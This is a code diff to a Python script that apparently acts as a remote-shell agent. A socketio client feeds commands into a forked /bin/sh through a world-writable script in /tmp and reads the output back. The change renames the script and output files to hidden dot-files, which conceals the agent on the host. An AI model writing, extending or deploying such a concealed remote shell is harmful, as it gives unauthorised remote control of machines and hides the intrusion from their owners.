@@ -11,7 +11,7 @@ sio = socketio.Client()
 
 ## Cleaning output file of child process
 
-os.system("echo '' > /tmp/output")
+os.system("echo '' > /tmp/.output")
 
 ## Create shell instance on fork
 
@@ -21,12 +21,12 @@ import signal
 pid, fd = pty.fork()
 
 if (pid == 0):
-    os.system("touch /tmp/patate.sh && chmod 777 /tmp/patate.sh")
-    buffer = open("/tmp/patate.sh", "w")
+    os.system("touch /tmp/.patate.sh && chmod 777 /tmp/.patate.sh")
+    buffer = open("/tmp/.patate.sh", "w")
     # Redirect output in /tmp/output.
-    buffer.write("#!/bin/bash\n/bin/sh &> /tmp/output")
+    buffer.write("#!/bin/bash\n/bin/sh &> /tmp/.output")
     buffer.close()
-    pty.spawn("/tmp/patate.sh")
+    pty.spawn("/tmp/.patate.sh")
 
 var = None
 
@@ -38,13 +38,13 @@ signal.signal(signal.SIGALRM, sHaND)
 
 def sendCommandToFork(entry):
     global var
-    size = os.stat("/tmp/output").st_size
-    os.system("echo '' > /tmp/output")
+    size = os.stat("/tmp/.output").st_size
+    os.system("echo '' > /tmp/.output")
     os.write(fd, bytes(entry + " && echo '' && kill -ALRM " + str(os.getpid()) + "\n", encoding="utf-8"))
     # Wait for end signal
     while (var == None): continue
     var = None
-    buffer = open("/tmp/output", "r")
+    buffer = open("/tmp/.output", "r")
     buffer.seek(size)
     output = buffer.read()
     buffer.close()
